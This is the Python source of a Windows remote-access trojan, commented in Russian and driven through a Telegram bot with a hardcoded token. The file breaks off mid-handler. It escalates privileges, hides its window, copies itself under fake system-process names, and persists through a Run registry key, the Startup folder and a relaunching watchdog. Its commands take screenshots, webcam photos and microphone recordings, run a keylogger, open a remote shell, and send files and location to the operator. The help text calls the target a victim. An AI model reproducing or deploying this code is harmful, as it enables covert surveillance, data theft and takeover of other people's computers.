#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time  # <-- теперь время импортировано сразу
import traceback
import subprocess
import importlib.metadata
import ctypes
import winreg
import shutil
import random
import tempfile
import threading
import zipfile
import io
import platform
import socket
import logging
from datetime import datetime

# ==================== ПЕРЕХВАТ ОШИБОК В ФАЙЛ (САМЫЙ ПЕРВЫЙ) ====================
def log_error_to_file(error_msg):
    try:
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        log_path = os.path.join(script_dir, "error.log")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"\n--- {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            f.write(error_msg)
            f.write("\n")
    except:
        pass

# ==================== УСТАНАВЛИВАЕМ РАБОЧУЮ ДИРЕКТОРИЮ ====================
script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
os.chdir(script_dir)

# ==================== ОСНОВНОЙ КОД (завёрнут в try для отлова) ====================
if __name__ == "__main__":
    while True:  # бесконечный перезапуск всего скрипта при критической ошибке
        try:
            # ---------- ПРОВЕРКА ТОКЕНА ----------
            TOKEN = "8949038941:AAHZBHI18YK1-LpnJhrQfo1kYyvPXFQPJpY"
            ID = 7558811554
            # Простая проверка токена (не блокирует)
            if not TOKEN or len(TOKEN) < 30:
                log_error_to_file("Токен слишком короткий или пустой!")
                time.sleep(5)
                continue

            # ---------- ОТЛАДОЧНЫЙ РЕЖИМ ----------
            DEBUG = False
            if "--debug" in sys.argv:
                DEBUG = True
                sys.argv.remove("--debug")

            def debug_print(*args, **kwargs):
                if DEBUG:
                    print(*args, **kwargs)

            # ---------- ЛОГИРОВАНИЕ В ФАЙЛ ----------
            LOG_FILE = os.path.join(script_dir, "bot_debug.log")

            def log_message(msg):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                try:
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"[{timestamp}] {msg}\n")
                except:
                    pass
                if DEBUG:
                    print(msg)

            debug_print = log_message  # единая функция логирования

            # ---------- ПРОВЕРКА ИНТЕРНЕТА ----------
            def is_connected():
                try:
                    socket.create_connection(("8.8.8.8", 53), timeout=3)
                    return True
                except:
                    return False

            def wait_for_internet():
                debug_print("Ожидание интернета...")
                while not is_connected():
                    debug_print("Нет интернета, ждём 5 сек...")
                    time.sleep(5)
                debug_print("Интернет появился!")

            def is_telegram_available():
                try:
                    socket.create_connection(("api.telegram.org", 443), timeout=5)
                    return True
                except:
                    return False

            def wait_for_telegram():
                debug_print("Ожидание доступа к Telegram API...")
                attempt = 0
                while not is_telegram_available():
                    attempt += 1
                    debug_print(f"Telegram API недоступен (попытка {attempt}), ждём 5 сек...")
                    time.sleep(5)
                    if attempt > 12:  # 1 минута
                        debug_print("Не удалось подключиться к Telegram API за 60 сек, перезапуск цикла...")
                        return False
                debug_print("Telegram API доступен!")
                return True

            # ---------- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ----------
            def is_admin():
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    return False

            def run_as_admin():
                if not is_admin():
                    try:
                        script = os.path.abspath(sys.argv[0])
                        params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
                        sys.exit()
                    except:
                        pass

            run_as_admin()
            debug_print("[+] Запущено с правами администратора")

            # ---------- УСТАНОВКА ПАКЕТОВ (с повторными попытками) ----------
            def install_packages():
                debug_print("[*] Проверка необходимых пакетов...")
                # сначала апгрейд pip
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
                except:
                    pass

                packages = {
                    "aiogram": "2.25.1",
                    "aiohttp": "3.10.11",
                    "aiosignal": "1.3.2",
                    "altgraph": "0.17.4",
                    "attrs": "24.3.0",
                    "Babel": "2.16.0",
                    "certifi": "2024.12.14",
                    "cffi": "1.17.1",
                    "charset-normalizer": "3.4.0",
                    "comtypes": "1.4.6",
                    "cryptography": "44.0.0",
                    "frozenlist": "1.5.0",
                    "GPUtil": "1.4.0",
                    "idna": "3.10",
                    "keyboard": "0.13.5",
                    "magic-filter": "1.0.12",
                    "MouseInfo": "0.1.3",
                    "multidict": "6.1.0",
                    "numpy": "1.26.4",
                    "opencv-python": "4.10.0.84",
                    "pefile": "2023.2.7",
                    "Pillow": "10.4.0",
                    "psutil": "6.1.1",
                    "PyAudio": "0.2.14",
                    "PyAutoGUI": "0.9.54",
                    "pycaw": "20230407",
                    "pycparser": "2.22",
                    "pycryptodome": "3.21.0",
                    "PyGetWindow": "0.0.9",
                    "pyinstaller": "6.10.0",
                    "pyinstaller-hooks-contrib": "2024.11",
                    "PyMsgBox": "1.0.9",
                    "pynput": "1.7.7",
                    "pyperclip": "1.9.0",
                    "pypiwin32": "223",
                    "PyRect": "0.2.0",
                    "PyScreeze": "1.0.1",
                    "pyttsx3": "2.90",
                    "pytweening": "1.2.0",
                    "pytz": "2024.2",
                    "pywin32": "308",
                    "pywin32-ctypes": "0.2.3",
                    "requests": "2.32.3",
                    "six": "1.17.0",
                    "tabulate": "0.9.0",
                    "urllib3": "2.2.3",
                    "Wave": "0.0.2",
                    "yarl": "1.18.3"
                }

                for pkg, ver in packages.items():
                    try:
                        importlib.metadata.version(pkg)
                        debug_print(f"[OK] {pkg} уже установлен")
                    except:
                        debug_print(f"[*] Установка {pkg}=={ver}...")
                        # повторные попытки
                        for attempt in range(3):
                            try:
                                subprocess.check_call([sys.executable, "-m", "pip", "install", f"{pkg}=={ver}"])
                                break
                            except Exception as e:
                                debug_print(f"[!] Попытка {attempt+1} для {pkg} не удалась: {e}")
                                time.sleep(2)
                        else:
                            debug_print(f"[!] Не удалось установить {pkg} после 3 попыток")

                # pyaudio через pipwin
                try:
                    import pyaudio
                except:
                    debug_print("[*] Установка pyaudio через pipwin...")
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", "pipwin"])
                        subprocess.check_call([sys.executable, "-m", "pipwin", "install", "pyaudio"])
                    except:
                        debug_print("[!] Не удалось установить pyaudio")

                debug_print("[+] Все пакеты проверены/установлены")

            install_packages()

            # ---------- ИМПОРТЫ (после установки) ----------
            from aiogram import Bot, Dispatcher, types, executor
            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            import psutil
            import pyautogui
            import PIL.ImageGrab
            import cv2
            import pyaudio
            import wave
            import keyboard as kb
            import pyperclip
            import GPUtil

            # ---------- СКРЫТИЕ КОНСОЛИ (если не отладка) ----------
            if not DEBUG:
                try:
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except:
                    pass

            # ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (установка копий, реестр и т.д.) ----------
            Thisfile = sys.argv[0]
            Thisfile_name = os.path.basename(Thisfile)
            user_path = os.path.expanduser('~')

            INSTALL_PATHS = [
                os.path.join(user_path, "AppData", "Roaming"),
                os.path.join(user_path, "AppData", "Local"),
                os.path.join(user_path, "AppData", "Local", "Temp"),
                os.path.join(user_path, "Documents"),
                os.path.join(user_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
            ]

            FAKE_NAMES = ['svchost.exe', 'explorer.exe', 'winlogon.exe', 'services.exe', 'lsass.exe', 'csrss.exe']

            def hide_file(filepath):
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)
                except:
                    pass

            def create_symlinks():
                debug_print("[*] Создание симлинков...")
                try:
                    system_dirs = [
                        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32',
                        os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64' if os.path.exists(os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64') else None,
                        os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    ]
                    for dir_path in system_dirs:
                        if not dir_path or not os.path.exists(dir_path):
                            continue
                        link_name = os.path.join(dir_path, 'svchost.exe.link')
                        if not os.path.exists(link_name):
                            try:
                                os.symlink(Thisfile, link_name)
                                hide_file(link_name)
                                debug_print(f"[+] Симлинк создан: {link_name}")
                            except Exception as e:
                                debug_print(f"[!] Не удалось создать симлинк в {dir_path}: {e}")
                except Exception as e:
                    debug_print(f"[!] Ошибка создания симлинков: {e}")

            def install_bot():
                debug_print("[*] Установка копий бота...")
                installed = False
                for path in INSTALL_PATHS[:3]:
                    try:
                        if not os.path.exists(path):
                            os.makedirs(path, exist_ok=True)
                        target = os.path.join(path, Thisfile_name)
                        shutil.copy2(Thisfile, target)
                        hide_file(target)
                        installed = True
                        debug_print(f"[+] Копия в {target}")
                    except Exception as e:
                        debug_print(f"[!] Ошибка копирования в {path}: {e}")

                for fname in FAKE_NAMES[:2]:
                    for path in INSTALL_PATHS[:2]:
                        try:
                            target = os.path.join(path, fname)
                            if not os.path.exists(target):
                                shutil.copy2(Thisfile, target)
                                hide_file(target)
                                installed = True
                                debug_print(f"[+] Копия под именем {fname} в {target}")
                        except Exception as e:
                            debug_print(f"[!] Ошибка: {e}")

                try:
                    create_startup_registry()
                except Exception as e:
                    debug_print(f"[!] Ошибка реестра: {e}")

                return installed

            def create_startup_registry():
                debug_print("[*] Добавление в автозапуск реестра...")
                try:
                    startup_path = os.path.join(user_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                    if not os.path.exists(startup_path):
                        os.makedirs(startup_path, exist_ok=True)

                    target = os.path.join(startup_path, Thisfile_name)
                    if not os.path.exists(target):
                        shutil.copy2(Thisfile, target)
                        hide_file(target)
                        debug_print(f"[+] Копия в автозагрузке: {target}")

                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
                    winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, f'"{sys.executable}" "{Thisfile}"')
                    winreg.CloseKey(key)
                    debug_print("[+] Запись в реестре создана")
                    return True
                except Exception as e:
                    debug_print(f"[!] Ошибка реестра: {e}")
                    return False

            def ensure_self_presence():
                debug_print("[*] Проверка наличия копий...")
                found = False
                for path in INSTALL_PATHS:
                    if os.path.exists(path):
                        try:
                            for file in os.listdir(path):
                                if file in FAKE_NAMES or file == Thisfile_name:
                                    full_path = os.path.join(path, file)
                                    if os.path.isfile(full_path):
                                        found = True
                                        break
                            if found:
                                break
                        except:
                            continue
                if not found:
                    debug_print("[!] Копий не найдено, восстанавливаю...")
                    install_bot()
                    create_startup_registry()
                    create_symlinks()
                else:
                    debug_print("[+] Копии присутствуют")

            def start_watchdog():
                try:
                    if not getattr(sys, '_watchdog_started', False):
                        sys._watchdog_started = True
                        watchdog_script = '''
import os
import sys
import time
import subprocess
import psutil

def is_running(pid):
    try:
        return psutil.pid_exists(pid)
    except:
        return False

def main():
    parent_pid = int(sys.argv[1])
    script_path = sys.argv[2]
    while True:
        if not is_running(parent_pid):
            subprocess.Popen([sys.executable, script_path], shell=True, creationflags=0x08000000)
            break
        time.sleep(3)

if __name__ == "__main__":
    main()
'''
                        watchdog_path = os.path.join(os.environ['TEMP'], 'watchdog_' + str(random.randint(1000,9999)) + '.py')
                        with open(watchdog_path, 'w') as f:
                            f.write(watchdog_script)
                        subprocess.Popen([sys.executable, watchdog_path, str(os.getpid()), Thisfile],
                                       shell=True, creationflags=0x08000000)
                        debug_print("[+] Watchdog запущен")
                except Exception as e:
                    debug_print(f"[!] Ошибка запуска watchdog: {e}")

            def persistence_watchdog():
                while True:
                    time.sleep(300)
                    ensure_self_presence()
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
                        winreg.QueryValueEx(key, "WindowsSystemService")
                        winreg.CloseKey(key)
                    except:
                        create_startup_registry()

            def update_bot(new_code):
                try:
                    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.py')
                    temp_file.write(new_code.encode('utf-8'))
                    temp_file.close()
                    all_copies = []
                    for path in INSTALL_PATHS:
                        if os.path.exists(path):
                            try:
                                for file in os.listdir(path):
                                    if file in FAKE_NAMES or file == Thisfile_name:
                                        full_path = os.path.join(path, file)
                                        if os.path.isfile(full_path):
                                            all_copies.append(full_path)
                            except:
                                continue
                    for copy_path in all_copies:
                        try:
                            shutil.copy2(temp_file, copy_path)
                            hide_file(copy_path)
                        except:
                            continue
                    try:
                        shutil.copy2(temp_file, Thisfile)
                    except:
                        pass
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                    return True
                except:
                    return False

            def self_destruct():
                try:
                    all_copies = []
                    for path in INSTALL_PATHS:
                        if os.path.exists(path):
                            try:
                                for file in os.listdir(path):
                                    if file in FAKE_NAMES or file == Thisfile_name:
                                        full_path = os.path.join(path, file)
                                        if os.path.isfile(full_path):
                                            all_copies.append(full_path)
                            except:
                                continue
                    for copy_path in all_copies:
                        try:
                            os.remove(copy_path)
                        except:
                            pass
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
                        winreg.DeleteValue(key, "WindowsSystemService")
                        winreg.CloseKey(key)
                    except:
                        pass
                    try:
                        for proc in psutil.process_iter(['pid', 'name']):
                            if proc.info['name'] == 'python.exe':
                                try:
                                    cmdline = proc.cmdline()
                                    for arg in cmdline:
                                        if 'watchdog' in str(arg):
                                            proc.kill()
                                except:
                                    pass
                    except:
                        pass
                    try:
                        bat_content = '@echo off\ntimeout /t 2 /nobreak >nul\ndel "' + Thisfile + '"\ndel "%~f0"\n'
                        bat_path = os.path.join(os.environ['TEMP'], 'delete_' + str(random.randint(1000,9999)) + '.bat')
                        with open(bat_path, 'w') as f:
                            f.write(bat_content)
                        subprocess.Popen([bat_path], shell=True, creationflags=0x08000000)
                    except:
                        pass
                    return True
                except:
                    return False

            def zip_folder(folder_path):
                try:
                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                        for root, dirs, files in os.walk(folder_path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                                zip_file.write(file_path, arcname)
                    zip_buffer.seek(0)
                    return zip_buffer.getvalue()
                except:
                    return None

            # ---------- УСТАНОВКА И САМОВОССТАНОВЛЕНИЕ ----------
            debug_print("[*] Выполнение установки и самовосстановления...")
            install_bot()
            ensure_self_presence()
            start_watchdog()
            threading.Thread(target=persistence_watchdog, daemon=True).start()
            debug_print("[+] Бот полностью развёрнут, запускаем телеграм-обработчик...")

            # ---------- СОЗДАНИЕ БОТА И ДИСПЕТЧЕРА ----------
            bot = Bot(token=TOKEN)
            dp = Dispatcher(bot)

            help_text = """Что можете выполнить в жертве ПК:\n
/help - Отправка всех доступных комманд.
/reboot - Перезагрузить клиентский ПК.
/shutdown - Выключить клиентский ПК.
/drivers - Все драйвера ПК.
/kill - Убить системную задачу.
/sysinfo - Основная информация о системе.
/tasklist - Все системные задачи.
/monitors - Получить список мониторов.
/turnoff_mon - Выключить монитор.
/turnon_mon - Включить монитор.
/volumeup - Увеличить громкость до 100%.
/volumedown - Уменьшить громкость до 0%.
/sendmessage - Отправить сообщение с текстом.
/setwallpaper - Изменить обои.
/open_link - Открыть ссылку в браузере.
/pwd - Получить текущий рабочий каталог.
/cd - Изменить каталог.
/dir - Получить все файлы текущего каталога.
/makedir - Создать директорию.
/rmdir - Удалить директорию.
/rmfile - Удалить файл.
/searchfile - Искать файл в системе.
/screenshot - Скриншот.
/chrome - Все данные Хрома (заглушка).
/webcam_snap - Сделать фото с веб-камеры.
/shell - Cmd.exe
/download - Cкачать файл.
/geolocate - Получить примерное местонахождение жертвы.
/keylogger_start - Запустить Keylogger.
/send_logs_keylogger - Отправить логи кейлоггера.
/keylogger_stop - Остановить Keylogger.
/audio - Запись аудио с пк жертвы.
/disablekeyboard - Отключить клавиатуру.
/enablekeyboard - Включить клавиатуру.
/disablemouse - Отключить мышку.
/enablemouse - Включить мышку.
/clipboard - Посмотреть буфер обмена.
/alt_f4 - Закрыть окно.
/runprogramm - Запустить программу.
/voice - Если ты скинешь мне голосовое сообщение я открою его у жертвы
/update - Обновить код бота (только для админа)
/selfdestruct - ПОЛНОЕ САМОУДАЛЕНИЕ БОТА (только для админа)
/getfolder - Скачать текущую папку в ZIP архиве (только для админа)
"""

            async def on_startup(_):
                keyboard = InlineKeyboardMarkup()
                next_ = InlineKeyboardButton(text='Продолжить.', callback_data='next')
                keyboard.add(next_)
                await bot.send_message(chat_id=ID, text='Жертва подключилась...', reply_markup=keyboard)

            @dp.message_handler(commands=['start'])
            async def start_commands(message: types.Message):
                if message.from_user.id == int(ID):
                    await bot.send_message(chat_id=ID, text='Нажми на /help')
                else:
                    await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')

            @dp.message_handler(commands=['help'])
            async def command_help(message: types.Message):
                if message.from_user.id == int(ID):
                    await bot.send_message(chat_id=ID, text=help_text)
                else:
                    await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')

            # ---------- ВСЕ ОСТАЛЬНЫЕ КОМАНДЫ ----------
            @dp.message_handler(commands=['reboot'])
            async def reboot_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    await bot.send_message(message.chat.id, 'Вы не админ!')
                    return
                os.system("shutdown /r /t 1")
                await bot.send_message(chat_id=ID, text="Перезагрузка...")

            @dp.message_handler(commands=['shutdown'])
            async def shutdown_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    await bot.send_message(message.chat.id, 'Вы не админ!')
                    return
                os.system("shutdown /s /t 1")
                await bot.send_message(chat_id=ID, text="Выключение...")

            @dp.message_handler(commands=['drivers'])
            async def drivers_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                result = subprocess.check_output("driverquery", shell=True, encoding='cp866', errors='ignore')
                await bot.send_message(chat_id=ID, text=f"Драйвера:\n{result[:4000]}")

            @dp.message_handler(commands=['sysinfo'])
            async def sysinfo_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                info = f"OS: {platform.system()} {platform.release()}\n"
                info += f"PC Name: {platform.node()}\n"
                info += f"CPU: {platform.processor()}\n"
                info += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                info += f"HDD: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB\n"
                info += f"IP: {requests.get('https://api.ipify.org').text}"
                await bot.send_message(chat_id=ID, text=info)

            @dp.message_handler(commands=['tasklist'])
            async def tasklist_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                tasks = subprocess.check_output("tasklist", shell=True, encoding='cp866', errors='ignore')
                await bot.send_message(chat_id=ID, text=f"Список задач:\n{tasks[:4000]}")

            @dp.message_handler(commands=['monitors'])
            async def monitors_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    import pygetwindow
                    monitors = pygetwindow.getWindowsWithTitle('')
                    text = f"Количество мониторов: {len(monitors)}\n" + "\n".join([str(m) for m in monitors])
                    await bot.send_message(chat_id=ID, text=text)
                except:
                    await bot.send_message(chat_id=ID, text="Не удалось получить список мониторов")

            @dp.message_handler(commands=['turnoff_mon'])
            async def turnoff_mon_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                os.system("powershell -Command \"(Add-Type '[DllImport(\\\"user32.dll\\\")]public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);' -Name a -Pas)::SendMessage(0xffff,0x0112,0xF170,0x00000002)\"")
                await bot.send_message(chat_id=ID, text="Монитор выключен")

            @dp.message_handler(commands=['turnon_mon'])
            async def turnon_mon_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                pyautogui.moveRel(0, 1)
                await bot.send_message(chat_id=ID, text="Монитор включён")

            @dp.message_handler(commands=['volumeup'])
            async def volumeup_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    from comtypes import CLSCTX_ALL
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = interface.QueryInterface(IAudioEndpointVolume)
                    volume.SetMasterVolumeLevelScalar(1.0, None)
                    await bot.send_message(chat_id=ID, text="Громкость 100%")
                except:
                    await bot.send_message(chat_id=ID, text="Ошибка регулировки громкости")

            @dp.message_handler(commands=['volumedown'])
            async def volumedown_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    from comtypes import CLSCTX_ALL
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = interface.QueryInterface(IAudioEndpointVolume)
                    volume.SetMasterVolumeLevelScalar(0.0, None)
                    await bot.send_message(chat_id=ID, text="Громкость 0%")
                except:
                    await bot.send_message(chat_id=ID, text="Ошибка регулировки громкости")

            @dp.message_handler(commands=['sendmessage'])
            async def sendmessage_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                msg = message.get_args()
                if msg:
                    await bot.send_message(chat_id=ID, text=f"Отправляю сообщение...")
                    os.system(f'message * "{msg}"')
                    await bot.send_message(chat_id=ID, text="Сообщение отправлено")

            @dp.message_handler(commands=['setwallpaper'])
            async def setwallpaper_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                await bot.send_message(chat_id=ID, text="Функция требует доработки (пришлите ссылку на картинку)")

            @dp.message_handler(commands=['open_link'])
            async def open_link_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                url = message.get_args()
                if url:
                    os.system(f'start {url}')
                    await bot.send_message(chat_id=ID, text=f"Открыто: {url}")

            @dp.message_handler(commands=['pwd'])
            async def pwd_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                await bot.send_message(chat_id=ID, text=f"Текущая директория: {os.getcwd()}")

            @dp.message_handler(commands=['cd'])
            async def cd_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                path = message.get_args()
                if path and os.path.exists(path):
                    os.chdir(path)
                    await bot.send_message(chat_id=ID, text=f"Перешли в {path}")
                else:
                    await bot.send_message(chat_id=ID, text="Путь не существует")

            @dp.message_handler(commands=['dir'])
            async def dir_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                files = os.listdir('.')
                await bot.send_message(chat_id=ID, text="\n".join(files[:500]))

            @dp.message_handler(commands=['makedir'])
            async def makedir_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                name = message.get_args()
                if name:
                    os.makedirs(name, exist_ok=True)
                    await bot.send_message(chat_id=ID, text=f"Директория {name} создана")
                else:
                    await bot.send_message(chat_id=ID, text="Укажите имя")

            @dp.message_handler(commands=['rmdir'])
            async def rmdir_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                name = message.get_args()
                if name and os.path.exists(name):
                    shutil.rmtree(name)
                    await bot.send_message(chat_id=ID, text=f"Директория {name} удалена")

            @dp.message_handler(commands=['rmfile'])
            async def rmfile_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                name = message.get_args()
                if name and os.path.isfile(name):
                    os.remove(name)
                    await bot.send_message(chat_id=ID, text=f"Файл {name} удалён")

            @dp.message_handler(commands=['searchfile'])
            async def searchfile_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                pattern = message.get_args()
                if pattern:
                    result = []
                    for root, dirs, files in os.walk('C:\\'):
                        for file in files:
                            if pattern.lower() in file.lower():
                                result.append(os.path.join(root, file))
                                if len(result) >= 20:
                                    break
                        if len(result) >= 20:
                            break
                    await bot.send_message(chat_id=ID, text="\n".join(result) if result else "Не найдено")

            @dp.message_handler(commands=['screenshot'])
            async def screenshot_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", "rb") as f:
                        await bot.send_photo(chat_id=ID, photo=f)
                    os.remove("screenshot.png")
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            @dp.message_handler(commands=['webcam_snap'])
            async def webcam_snap_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    if ret:
                        cv2.imwrite("webcam.jpg", frame)
                        with open("webcam.jpg", "rb") as f:
                            await bot.send_photo(chat_id=ID, photo=f)
                        os.remove("webcam.jpg")
                    else:
                        await bot.send_message(chat_id=ID, text="Не удалось получить кадр")
                    cap.release()
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            @dp.message_handler(commands=['shell'])
            async def shell_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                cmd = message.get_args()
                if not cmd:
                    await bot.send_message(chat_id=ID, text="Введите команду после /shell")
                    return
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, encoding='cp866', errors='ignore', timeout=30)
                    await bot.send_message(chat_id=ID, text=result[:4000] if result else "Выполнено (без вывода)")
                except subprocess.TimeoutExpired:
                    await bot.send_message(chat_id=ID, text="Команда выполнялась слишком долго")
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            @dp.message_handler(commands=['download'])
            async def download_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                args = message.get_args().split()
                if not args:
                    await bot.send_message(chat_id=ID, text="Укажите путь к файлу")
                    return
                filepath = args[0]
                if os.path.isfile(filepath):
                    try:
                        with open(filepath, "rb") as f:
                            await bot.send_document(chat_id=ID, document=f)
                    except Exception as e:
                        await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")
                else:
                    await bot.send_message(chat_id=ID, text="Файл не найден")

            @dp.message_handler(commands=['geolocate'])
            async def geolocate_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    ip = requests.get('https://api.ipify.org').text
                    geo = requests.get(f'http://ip-api.com/json/{ip}').json()
                    text = f"IP: {ip}\nСтрана: {geo.get('country')}\nРегион: {geo.get('regionName')}\nГород: {geo.get('city')}\nКоординаты: {geo.get('lat')}, {geo.get('lon')}"
                    await bot.send_message(chat_id=ID, text=text)
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            # ---------- КЕЙЛОГГЕР ----------
            keylogger_running = False
            keylogger_file = "keylog.txt"

            @dp.message_handler(commands=['keylogger_start'])
            async def keylogger_start_handler(message: types.Message):
                global keylogger_running
                if message.from_user.id != int(ID):
                    return
                if keylogger_running:
                    await bot.send_message(chat_id=ID, text="Кейлоггер уже запущен")
                    return
                keylogger_running = True
                def log():
                    import keyboard
                    with open(keylogger_file, "a") as f:
                        f.write("=== Кейлоггер запущен ===\n")
                    keyboard.on_release(lambda e: open(keylogger_file, "a").write(e.name + " ") if keylogger_running else None)
                    while keylogger_running:
                        time.sleep(1)
                threading.Thread(target=log, daemon=True).start()
                await bot.send_message(chat_id=ID, text="Кейлоггер запущен")

            @dp.message_handler(commands=['keylogger_stop'])
            async def keylogger_stop_handler(message: types.Message):
                global keylogger_running
                if message.from_user.id != int(ID):
                    return
                keylogger_running = False
                await bot.send_message(chat_id=ID, text="Кейлоггер остановлен")

            @dp.message_handler(commands=['send_logs_keylogger'])
            async def send_logs_keylogger_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                if os.path.isfile(keylogger_file):
                    with open(keylogger_file, "rb") as f:
                        await bot.send_document(chat_id=ID, document=f)
                else:
                    await bot.send_message(chat_id=ID, text="Логов нет")

            # ---------- АУДИОЗАПИСЬ ----------
            @dp.message_handler(commands=['audio'])
            async def audio_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    duration = 10
                    await bot.send_message(chat_id=ID, text=f"Запись аудио {duration} сек...")
                    p = pyaudio.PyAudio()
                    stream = p.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
                    frames = []
                    for _ in range(0, int(16000 / 1024 * duration)):
                        data = stream.read(1024)
                        frames.append(data)
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    wf = wave.open("audio.wav", "wb")
                    wf.setnchannels(1)
                    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
                    wf.setframerate(16000)
                    wf.writeframes(b''.join(frames))
                    wf.close()
                    with open("audio.wav", "rb") as f:
                        await bot.send_audio(chat_id=ID, audio=f)
                    os.remove("audio.wav")
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            # ---------- УПРАВЛЕНИЕ КЛАВИАТУРОЙ И МЫШКОЙ ----------
            @dp.message_handler(commands=['disablekeyboard'])
            async def disablekeyboard_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                os.system("rundll32.exe keyboard,disable")
                await bot.send_message(chat_id=ID, text="Клавиатура отключена")

            @dp.message_handler(commands=['enablekeyboard'])
            async def enablekeyboard_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                os.system("rundll32.exe keyboard,enable")
                await bot.send_message(chat_id=ID, text="Клавиатура включена")

            @dp.message_handler(commands=['disablemouse'])
            async def disablemouse_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                os.system("rundll32.exe mouse,disable")
                await bot.send_message(chat_id=ID, text="Мышь отключена")

            @dp.message_handler(commands=['enablemouse'])
            async def enablemouse_handler(message: types.Message):
